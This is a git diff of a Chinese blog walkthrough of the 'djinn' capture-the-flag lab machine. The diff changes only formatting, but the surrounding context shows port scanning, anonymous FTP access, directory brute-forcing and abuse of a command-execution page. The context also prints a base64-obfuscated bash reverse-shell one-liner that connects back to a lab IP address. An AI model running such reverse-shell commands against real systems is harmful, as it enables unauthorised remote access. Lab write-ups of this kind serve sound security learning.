@@ -89,16 +89,16 @@
 <p><img src="/images/djinn/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0.png" alt="nmap 192.168.xxx.0/24"></p>
 <h5 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h5><p>​      获得靶机的ip后，接下来探测靶机的ip，可以发现，靶机开放了21,1337,7331端口，接下来就是端口利用了</p>
 <p> <img src="/images/djinn/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png" alt="nmap -sV -p- 192.168.xxx.xxx"></p>
-<p>​                                                        #####    端口利用</p>
-<p>​                                                      #######    21端口利用</p>
+<p>​                                                        #####      端口利用</p>
+<p>​                                                      ######  21端口利用</p>
 <p>   在命令行利用ftp 192.168.224.155进行连接，使用默认的匿名用户anonymous 空密码登陆后，可以发现三个文件，使用get命令下载后，未发现有用信息，接下，看看其他端口。</p>
 <p><img src="/images/djinn/21-ftp%E8%BF%9E%E6%8E%A5.png" alt="ftp信息"></p>
-<p>​                                                #######       1337端口利用</p>
+<p>​                                                ###### 1337端口利用</p>
 <p>  使用浏览器访问192.168.xxx.xxx:1337访问后，可以发现访问被重置，但是可以使用nc 进行连接</p>
 <p><img src="/images/djinn/1337%E7%AB%AF%E5%8F%A3%E8%AE%BF%E9%97%AE.png" alt="1337"></p>
 <p><img src="/images/djinn/1337nc%E8%BF%9E%E6%8E%A5.png" alt=""></p>
 <p>​     发现为数学运算…1000次，算了算了，下一个下一个，其实这里可以使用脚本跑，有兴趣的同学自可以尝试一下。</p>
-<p>​                                                                   ######     7331端口利用</p>
+<p>​                                                                   ######    7331端口利用</p>
 <p>​       一开始访问这个页面，本菜以为是作者放出来的迷雾弹，没怎么上心。使用dirb的默认字典，没有得出结果后便去看别的端口，最后还是老老实实回来了。这次使用gobuster进行扫描，字典使用大字典。</p>
 <p><img src="/images/djinn/7331%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95.png" alt="gouster扫描结果"></p>
 <p> 这次扫描出来两个目录，进行访问，这里重点放在wish目录，可以发现wish有个命令执行，进行简单的测试，使用whoami,ls，进行测试</p>
@@ -115,12 +115,12 @@
 <p>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNC4xNjEvNTY3OCAwPiYx | base64 -d | bash</p>
 <p>这条语句应该在浏览器内中执行，burpsuite的重放模块不一定能反弹到。</p>
 <p>​                   </p>
-<p>​                                                                     #####    提权</p>
+<p>​                                                                     #####  提权</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://qimingstar.github.io/2019/12/01/djinn/" data-id="ck3o1350i0000n9jx9zaahfsm" class="article-share-link">Share</a>
+      <a data-url="https://qimingstar.github.io/2019/12/01/djinn/" data-id="ck3od2b3p0000fojx4tei6g6x" class="article-share-link">Share</a>
       
       
     </footer>
@@ -157,7 +157,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://qimingstar.github.io/2019/12/01/hello-world/" data-id="ck3o1351j0001n9jx6vjs4i36" class="article-share-link">Share</a>
+      <a data-url="https://qimingstar.github.io/2019/12/01/hello-world/" data-id="ck3od2b3z0001fojxa56s3sem" class="article-share-link">Share</a>
       
       
     </footer>
